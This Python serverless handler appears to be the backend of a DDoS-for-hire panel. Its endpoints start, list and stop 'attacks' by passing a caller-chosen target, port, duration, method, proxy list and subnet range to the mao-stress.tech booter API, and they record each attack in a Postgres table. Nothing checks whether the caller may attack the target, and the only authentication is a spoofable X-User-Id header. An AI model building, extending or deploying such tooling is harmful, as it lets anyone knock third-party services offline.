'''
Business: Universal API for attack management - start, list, stop attacks via mao-stress.tech
Args: event with httpMethod (GET list, POST start/stop), body, queryStringParameters
Returns: HTTP response with attack data or confirmation
'''

import json
import os
from datetime import datetime, timedelta
from typing import Dict, Any, List
import psycopg2
from psycopg2.extras import RealDictCursor
import urllib.request
import urllib.parse
import urllib.error

def handler(event: Dict[str, Any], context: Any) -> Dict[str, Any]:
    method: str = event.get('httpMethod', 'GET')
    
    if method == 'OPTIONS':
        return {
            'statusCode': 200,
            'headers': {
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
                'Access-Control-Allow-Headers': 'Content-Type, X-User-Id, X-Auth-Token',
                'Access-Control-Max-Age': '86400'
            },
            'body': ''
        }
    
    headers = event.get('headers', {})
    user_id = headers.get('x-user-id') or headers.get('X-User-Id')
    
    if not user_id:
        return {
            'statusCode': 401,
            'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
            'body': json.dumps({'error': 'User ID required'})
        }
    
    if method == 'GET':
        return handle_list(user_id, event)
    elif method == 'POST':
        body_data = json.loads(event.get('body', '{}'))
        action = body_data.get('action', 'start')
        
        if action == 'start':
            return handle_start(user_id, body_data)
        elif action == 'stop':
            return handle_stop(user_id, body_data)
        else:
            return {
                'statusCode': 400,
                'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
                'body': json.dumps({'error': 'Invalid action. Use "start" or "stop"'})
            }
    else:
        return {
            'statusCode': 405,
            'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
            'body': json.dumps({'error': 'Method not allowed'})
        }


def handle_list(user_id: str, event: Dict[str, Any]) -> Dict[str, Any]:
    query_params = event.get('queryStringParameters') or {}
    status_filter = query_params.get('status')
    
    dsn = os.environ.get('DATABASE_URL')
    if not dsn:
        return {
            'statusCode': 500,
            'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
            'body': json.dumps({'error': 'Database not configured'})
        }
    
    conn = psycopg2.connect(dsn)
    cursor = conn.cursor(cursor_factory=RealDictCursor)
    
    if status_filter:
        cursor.execute("""
            SELECT id, target, port, duration, method, status,
                   rate, rqmethod, proxylist, headers, http_version, protocol,
                   postdata, payload, range_subnet, external_attack_id,
                   started_at, expires_at, completed_at, error_message, created_at
            FROM attacks
            WHERE user_id = %s AND status = %s
            ORDER BY created_at DESC
        """, (int(user_id), status_filter))
    else:
        cursor.execute("""
            SELECT id, target, port, duration, method, status,
                   rate, rqmethod, proxylist, headers, http_version, protocol,
                   postdata, payload, range_subnet, external_attack_id,
                   started_at, expires_at, completed_at, error_message, created_at
            FROM attacks
            WHERE user_id = %s
            ORDER BY created_at DESC
        """, (int(user_id),))
    
    attacks = cursor.fetchall()
    cursor.close()
    conn.close()
    
    attacks_list: List[Dict[str, Any]] = []
    for attack in attacks:
        attack_dict = dict(attack)
        
        if attack_dict.get('started_at'):
            attack_dict['started_at'] = attack_dict['started_at'].isoformat()
        if attack_dict.get('expires_at'):
            attack_dict['expires_at'] = attack_dict['expires_at'].isoformat()
        if attack_dict.get('completed_at'):
            attack_dict['completed_at'] = attack_dict['completed_at'].isoformat()
        if attack_dict.get('created_at'):
            attack_dict['created_at'] = attack_dict['created_at'].isoformat()
        
        attacks_list.append(attack_dict)
    
    return {
        'statusCode': 200,
        'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
        'isBase64Encoded': False,
        'body': json.dumps({
            'success': True,
            'count': len(attacks_list),
            'attacks': attacks_list
        })
    }


def handle_start(user_id: str, body_data: Dict[str, Any]) -> Dict[str, Any]:
    target = body_data.get('target')
    duration = body_data.get('duration')
    attack_method = body_data.get('method')
    
    if not target or not duration or not attack_method:
        return {
            'statusCode': 400,
            'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
            'body': json.dumps({'error': 'target, duration, and method are required'})
        }
    
    port = body_data.get('port')
    rate = body_data.get('rate')
    rqmethod = body_data.get('rqmethod')
    proxylist = body_data.get('proxylist')
    headers_custom = body_data.get('headers')
    http_version = body_data.get('http_version')
    protocol = body_data.get('protocol')
    postdata = body_data.get('postdata')
    payload = body_data.get('payload')
    range_subnet = body_data.get('range')
    
    mao_user = os.environ.get('MAO_API_USER')
    mao_key = os.environ.get('MAO_API_KEY')
    
    if not mao_user or not mao_key:
        return {
            'statusCode': 500,
            'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
            'body': json.dumps({'error': 'MAO API credentials not configured'})
        }
    
    params = {
        'user': mao_user,
        'api_key': mao_key,
        'target': target,
        'duration': str(duration),
        'method': attack_method
    }
    
    if port:
        params['port'] = str(port)
    if rate:
        params['rate'] = str(rate)
    if rqmethod:
        params['rqmethod'] = rqmethod
    if proxylist:
        params['proxylist'] = proxylist
    if headers_custom:
        params['headers'] = headers_custom
    if http_version:
        params['http_version'] = str(http_version)
    if protocol:
        params['protocol'] = str(protocol)
    if postdata:
        params['postdata'] = postdata
    if payload:
        params['payload'] = payload
    if range_subnet:
        params['range'] = str(range_subnet)
    
    api_url = f"https://mao-stress.tech/api/start.php?{urllib.parse.urlencode(params)}"
    
    try:
        with urllib.request.urlopen(api_url, timeout=10) as response:
            api_response = response.read().decode('utf-8')
    except urllib.error.HTTPError as e:
        return {
            'statusCode': 502,
            'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
            'body': json.dumps({'error': f'MAO API error: {e.code}'})
        }
    except Exception as e:
        return {
            'statusCode': 502,
            'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
            'body': json.dumps({'error': f'Failed to call MAO API: {str(e)}'})
        }
    
    dsn = os.environ.get('DATABASE_URL')
    if not dsn:
        return {
            'statusCode': 500,
            'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
            'body': json.dumps({'error': 'Database not configured'})
        }
    
    conn = psycopg2.connect(dsn)
    cursor = conn.cursor(cursor_factory=RealDictCursor)
    
    started_at = datetime.utcnow()
    expires_at = started_at + timedelta(seconds=int(duration))
    
    cursor.execute("""
        INSERT INTO attacks (
            user_id, target, port, duration, method, status,
            rate, rqmethod, proxylist, headers, http_version, protocol, 
            postdata, payload, range_subnet,
            started_at, expires_at
        ) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
        RETURNING id
    """, (
        int(user_id), target, port, int(duration), attack_method, 'running',
        rate, rqmethod, proxylist, headers_custom, http_version, protocol,
        postdata, payload, range_subnet,
        started_at, expires_at
    ))
    
    result = cursor.fetchone()
    attack_id = result['id']
    
    conn.commit()
    cursor.close()
    conn.close()
    
    return {
        'statusCode': 200,
        'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
        'isBase64Encoded': False,
        'body': json.dumps({
            'success': True,
            'attack_id': attack_id,
            'target': target,
            'duration': duration,
            'method': attack_method,
            'expires_at': expires_at.isoformat(),
            'mao_response': api_response
        })
    }


def handle_stop(user_id: str, body_data: Dict[str, Any]) -> Dict[str, Any]:
    attack_id = body_data.get('attack_id')
    
    if not attack_id:
        return {
            'statusCode': 400,
            'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
            'body': json.dumps({'error': 'attack_id is required'})
        }
    
    dsn = os.environ.get('DATABASE_URL')
    if not dsn:
        return {
            'statusCode': 500,
            'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
            'body': json.dumps({'error': 'Database not configured'})
        }
    
    conn = psycopg2.connect(dsn)
    cursor = conn.cursor(cursor_factory=RealDictCursor)
    
    cursor.execute("""
        SELECT id, external_attack_id, status, user_id
        FROM attacks
        WHERE id = %s
    """, (int(attack_id),))
    
    attack = cursor.fetchone()
    
    if not attack:
        cursor.close()
        conn.close()
        return {
            'statusCode': 404,
            'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
            'body': json.dumps({'error': 'Attack not found'})
        }
    
    if attack['user_id'] != int(user_id):
        cursor.close()
        conn.close()
        return {
            'statusCode': 403,
            'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
            'body': json.dumps({'error': 'Not authorized to stop this attack'})
        }
    
    if attack['status'] != 'running':
        cursor.close()
        conn.close()
        return {
            'statusCode': 400,
            'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
            'body': json.dumps({'error': f'Attack is not running (status: {attack["status"]})'})
        }
    
    mao_user = os.environ.get('MAO_API_USER')
    mao_key = os.environ.get('MAO_API_KEY')
    
    if not mao_user or not mao_key:
        cursor.close()
        conn.close()
        return {
            'statusCode': 500,
            'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
            'body': json.dumps({'error': 'MAO API credentials not configured'})
        }
    
    external_id = attack.get('external_attack_id')
    
    if external_id:
        params = {
            'user': mao_user,
            'api_key': mao_key,
            'id': str(external_id)
        }
        
        api_url = f"https://mao-stress.tech/api/stop.php?{urllib.parse.urlencode(params)}"
        
        try:
            with urllib.request.urlopen(api_url, timeout=10) as response:
                api_response = response.read().decode('utf-8')
        except Exception as e:
            api_response = f"Error: {str(e)}"
    else:
        api_response = "No external_attack_id found"
    
    cursor.execute("""
        UPDATE attacks
        SET status = 'stopped', completed_at = %s, updated_at = %s
        WHERE id = %s
    """, (datetime.utcnow(), datetime.utcnow(), int(attack_id)))
    
    conn.commit()
    cursor.close()
    conn.close()
    
    return {
        'statusCode': 200,
        'headers': {'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*'},
        'isBase64Encoded': False,
        'body': json.dumps({
            'success': True,
            'attack_id': attack_id,
            'status': 'stopped',
            'mao_response': api_response
        })
    }
